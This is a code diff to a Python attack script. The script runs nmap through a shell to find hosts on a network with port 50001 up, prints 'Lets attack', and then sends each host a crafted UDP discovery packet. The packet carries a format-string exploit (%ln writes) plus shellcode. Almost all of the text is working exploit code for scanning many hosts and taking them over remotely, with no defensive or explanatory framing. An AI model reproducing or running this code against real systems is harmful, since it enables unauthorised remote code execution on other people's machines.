@@ -29,12 +29,12 @@ def port_scan(network, port):
     try:
         print('Scanning Network')
         # Run nmap and pipe its output to awk
-        command = f'nmap -oG - -p {port} {network} | awk \'/Open$/{{print $2}}\''
+        command = f'nmap -oG - -p {port} {network} | awk \'/Up$/{{print $2}}\''
         output = subprocess.check_output(command, shell=True, text=True)
 
         # Split the output by newlines to get a list of IPs
         ip_addresses = output.strip().split('\n')
-        print('Done')
+        print('Done!', len(ip_addresses), 'Hosts are up')
         return ip_addresses
     except subprocess.CalledProcessError as e:
         return []
@@ -101,9 +101,9 @@ try:
     port = 50001  # Define the port to scan
     neighbors = port_scan(network, port)
     print('Lets attack')
+    print('Brute all active Hosts on Port 50001')
     
     for ip in neighbors:
-        print(ip, 'is fucked')
         p = gen_discover_packet(4919, 1, b'\x85\xfe%1$*1$x%18x%165$ln' + shellcode, b'\x85\xfe%18472249x%93$ln', 'ad', 'main')
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.sendto(p, (ip, port))
